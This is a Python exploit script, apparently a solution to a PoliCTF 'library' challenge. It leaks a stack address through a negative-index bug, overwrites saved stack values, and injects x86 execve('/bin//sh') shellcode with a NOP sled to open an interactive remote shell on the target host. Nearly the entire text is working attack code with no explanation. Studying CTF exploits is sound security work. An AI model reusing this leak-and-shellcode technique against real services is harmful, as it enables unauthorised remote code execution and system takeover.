import zio
import struct
import time

#T = ("127.0.0.1",4444)
T = ("library.polictf.it",80)
io = zio.zio(T)

off_addr_ebp = -35

#set offset
io.read_until("exit")
io.write("a\n")
io.read_until("title:")
io.write(str(off_addr_ebp-1) + "\n")
payload = "AAAA"
io.write(payload + "\n")

#get addr
io.read_until("exit")
io.write("r\n")
io.read_until("read:")
io.write("1\n")
io.read(1) #read 1 byte here
res = io.read(4)
addr_ebp = struct.unpack("<I",res)[0]
print "\nebp:",hex(addr_ebp)

#addr of buffer
addr_buf = addr_ebp - 1037
print 'addr buf:',hex(addr_buf)

#restore num
io.read_until("exit")
io.write("a\n")
io.read_until("title:")
io.write(str(-off_addr_ebp-2) + "\n")
payload = struct.pack("<I",addr_ebp)
payload += "\x01\x86\x04\x08"
io.write(payload + "\n")

#send shellcode
io.read_until("exit")
io.write("a\n")
io.read_until("title:")
io.write("2\n")
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" + \
        "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = "\x90" * 3 + payload

#print len(payload),"bytes"
io.write(payload+struct.pack("<I",addr_buf)*320 + "\n")
io.read_until("exit")
io.write("u\n")
io.interact()
